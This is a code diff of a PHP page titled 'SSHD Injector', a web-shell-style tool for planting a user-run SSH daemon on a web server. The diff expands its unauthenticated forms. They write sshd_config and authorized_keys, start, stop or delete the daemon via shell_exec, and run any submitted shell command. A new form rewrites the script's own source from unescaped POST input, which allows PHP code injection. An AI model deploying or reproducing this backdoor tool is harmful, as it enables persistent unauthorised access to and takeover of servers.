@@ -2,9 +2,38 @@
 <!-- Alexis Giraudet -->
 <?php
 
-$sshd_bin = "sshd"; //line5
-$ssh_keygen_bin = "ssh-keygen"; //line6
-$workspace = "."; //line7
+if(isset($_POST["sshd"]) || isset($_POST["sshkeygen"]) || isset($_POST["workspace"]))
+{
+    //echo "<html><head><meta charset=\"utf-8\"/><title>Reload</title><script>location.reload(true);</script></head><body></body></html>";
+    
+    $script_content = file_get_contents(basename(__FILE__));
+
+    if(isset($_POST["sshd"]))
+    {
+        $script_content = preg_replace('#^\\$sshd_bin = "*.";$#', '$sshd_bin = "'.$_POST["sshd"].'";', $script_content);
+    }
+
+    if(isset($_POST["sshkeygen"]))
+    {
+        $script_content = preg_replace('#^\\$ssh_keygen_bin = "*.";$#', '$ssh_keygen_bin = "'.$_POST["sshkeygen"].'";', $script_content);
+    }
+
+    if(isset($_POST["workspace"]))
+    {
+        $script_content = preg_replace('#^\\$workspace = "*.";$#', '$workspace = "'.$_POST["workspace"].'";', $script_content);
+    }
+
+    file_put_contents(basename(__FILE__), $script_content);
+
+    header("Location:".basename(__FILE__));
+
+    exit(0);
+}
+
+//todo: escape variable value, reload page and interrupt script
+$sshd_bin = "sshd";
+$ssh_keygen_bin = "ssh-keygen";
+$workspace = ".";
 
 $workspace = realpath($workspace);
 if($workspace === FALSE)
@@ -37,6 +66,9 @@ UsePrivilegeSeparation no
 PidFile $sshd_pidfile
 AuthorizedKeysCommand $sshd_authorized_keys";
 
+$file_exist = "present";
+$not_file_exist = "absent";
+
 function prepare_dir($dir)
 {
     if(@is_dir($dir))
@@ -46,28 +78,13 @@ function prepare_dir($dir)
     return @mkdir($dir);
 }
 
-function start()
-{
-    ;
-}
-
-function stop()
-{
-    ;
-}
-
-function clear()
-{
-    ;
-}
-
 ?>
 <html>
     <head>
-        <meta charset="utf-8" />
+        <meta charset="utf-8"/>
         <title>SSHD Injector</title>
         <style>
-        p, table, th, td { border: medium solid black; }
+        p, table, th, td { border: thin solid black; }
         input, textarea { width: 100%; }
         </style>
     </head>
@@ -89,23 +106,23 @@ function clear()
         <table>
             <tr>
                 <td><?php echo htmlentities($sshd_path); ?></td>
-                <td><?php if($sshd_path_exist){ echo "O"; } else{ echo "X"; } ?></td>
+                <td><?php if($sshd_path_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
             </tr>
             <tr>
                 <td><?php echo htmlentities($sshd_authorized_keys); ?></td>
-                <td><?php if($sshd_authorized_keys_exist){ echo "O"; } else{ echo "X"; } ?></td>
+                <td><?php if($sshd_authorized_keys_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
             </tr>
             <tr>
                 <td><?php echo htmlentities($sshd_config); ?></td>
-                <td><?php if($sshd_config_exist){ echo "O"; } else{ echo "X"; } ?></td>
+                <td><?php if($sshd_config_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
             </tr>
             <tr>
                 <td><?php echo htmlentities($sshd_hostkey); ?></td>
-                <td><?php if($sshd_hostkey_exist){ echo "O"; } else{ echo "X"; } ?></td>
+                <td><?php if($sshd_hostkey_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
             </tr>
             <tr>
                 <td><?php echo htmlentities($sshd_pidfile); ?></td>
-                <td><?php if($sshd_pidfile_exist){ echo "O"; } else{ echo "X"; } ?></td>
+                <td><?php if($sshd_pidfile_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
             </tr>
         </table>
         <form method="post" action="<?php echo basename(__FILE__); ?>">
@@ -114,7 +131,7 @@ function clear()
 <?php
                 if(isset($_POST["sshd_config_content"]))
                 {
-                    echo "<p style=\"border-style: solid; border-width: medium;\">";
+                    echo "<p>";
                     if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_config, $_POST["sshd_config_content"]) === FALSE))
                     {
                         echo "Error";
@@ -126,7 +143,7 @@ function clear()
                     echo "</p>";
                 }
 ?>
-<textarea name="sshd_config_content" style="width:100%" required>
+<textarea name="sshd_config_content" required>
 <?php
                     $sshd_config_content = @file_get_contents($sshd_config);
                     if($sshd_config_content === FALSE)
@@ -139,8 +156,8 @@ function clear()
                     }
 ?>
 </textarea>
-                <br />
-                <input type="submit" value="Update sshd_config" />
+                <br>
+                <input type="submit" value="Update sshd_config"/>
             </fieldset>
         </form>
         <form method="post" action="<?php echo basename(__FILE__); ?>">
@@ -149,7 +166,7 @@ function clear()
 <?php
                 if(isset($_POST["authorized_keys_content"]))
                 {
-                    echo "<p style=\"border-style: solid; border-width: medium;\">";
+                    echo "<p>";
                     if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_authorized_keys, $_POST["authorized_keys_content"]) === FALSE))
                     {
                         echo "Error";
@@ -161,7 +178,7 @@ function clear()
                     echo "</p>";
                 }
 ?>
-<textarea name="authorized_keys_content" style="width:100%" required>
+<textarea name="authorized_keys_content" required>
 <?php
                     $sshd_authorized_keys_content = @file_get_contents($sshd_authorized_keys);
                     if($sshd_authorized_keys_content === FALSE)
@@ -174,8 +191,62 @@ function clear()
                     }
 ?>
 </textarea>
-                <br />
-                <input type="submit" value="Update authorized_keys" />
+                <br>
+                <input type="submit" value="Update authorized_keys"/>
+            </fieldset>
+        </form>
+        <form method="post" action="<?php echo basename(__FILE__); ?>">
+            <fieldset>
+                <legend>Start Stop Clear sshd</legend>
+<?php
+                if(isset($_POST["clear"]) && ($_POST["clear"] == "checked"))
+                {
+                    $clear_cmd = "rm -rf $sshd_path";
+                    echo "<p>";
+                    echo htmlentities("$ ".$clear_cmd)."<br>";
+                    echo nl2br(htmlentities(shell_exec($clear_cmd)));
+                    echo "</p>";
+                }
+?>
+                <input type="checkbox" name="clear" id="clear" value="checked"><label for="clear">Clear</label>
+                <br>
+<?php
+                if(isset($_POST["stop"]) && ($_POST["stop"] == "checked"))
+                {
+                    $stop_cmd = "kill `cat $sshd_pidfile` ; rm $sshd_pidfile";
+                    echo "<p>";
+                    echo htmlentities("$ ".$stop_cmd)."<br>";
+                    echo nl2br(htmlentities(shell_exec($stop_cmd)));
+                    echo "</p>";
+                }
+?>
+                <input type="checkbox" name="stop" id="stop" value="checked"><label for="stop">Stop</label>
+                <br>
+<?php
+                if(isset($_POST["start"]) && ($_POST["start"] == "checked"))
+                {
+                    $start_cmd = "$sshd_bin -f $sshd_config";
+                    echo "<p>";
+                    echo htmlentities("$ ".$start_cmd)."<br>";
+                    echo nl2br(htmlentities(shell_exec($start_cmd)));
+                    echo "</p>";
+                }
+?>
+                <input type="checkbox" name="start" id="start" value="checked"><label for="start">Start</label>
+                <br>
+<?php
+                if(isset($_POST["keygen"]) && ($_POST["keygen"] == "checked"))
+                {
+                    $keygen_cmd = "$ssh_keygen_bin -f $sshd_hostkey -N ''";
+                    echo "<p>";
+                    echo htmlentities("$ ".$keygen_cmd)."<br>";
+                    echo nl2br(htmlentities(shell_exec($keygen_cmd)));
+                    echo "</p>";
+                }
+?>
+                <input type="checkbox" name="keygen" id="keygen" value="checked"><label for="keygen">Generate key</label>
+                <br>
+                <input type="submit" value="Execute"/>
             </fieldset>
         </form>
         <form method="post" action="<?php echo basename(__FILE__); ?>">
@@ -184,15 +255,27 @@ function clear()
 <?php
                 if(isset($_POST["command"]))
                 {
-                    echo "<p style=\"border-style: solid; border-width: medium;\">";
+                    echo "<p>";
                     echo htmlentities("$ ".$_POST["command"])."<br>";
                     echo nl2br(htmlentities(shell_exec($_POST["command"])));
                     echo "</p>";
                 }
 ?>
-                <input type="text" name="command" value="find `echo $PATH | tr ':' ' '` -name 'sshd' 2> /dev/null" style="width:100%">
-                <br />
-                <input type="submit" value="Execute" />
+                <input type="text" name="command" value="find `echo $PATH | tr ':' ' '` -name 'sshd' 2> /dev/null">
+                <br>
+                <input type="submit" value="Execute"/>
+            </fieldset>
+        </form>
+        <form method="post" action="<?php echo basename(__FILE__); ?>">
+            <fieldset>
+                <legend>Update sshd ssh-keygen workspace</legend>
+                <label>sshd = </label><input type="text" name="sshd" value="<?php echo $sshd_bin; ?>" required>
+                <br>
+                <label>ssh-keygen = </label><input type="text" name="sshkeygen" value="<?php echo $ssh_keygen_bin; ?>" required>
+                <br>
+                <label>workspace = </label><input type="text" name="workspace" value="<?php echo $workspace; ?>" required>
+                <br>
+                <input type="submit" value="Update sshd ssh-keygen workspace"/>
             </fieldset>
         </form>
     </body>
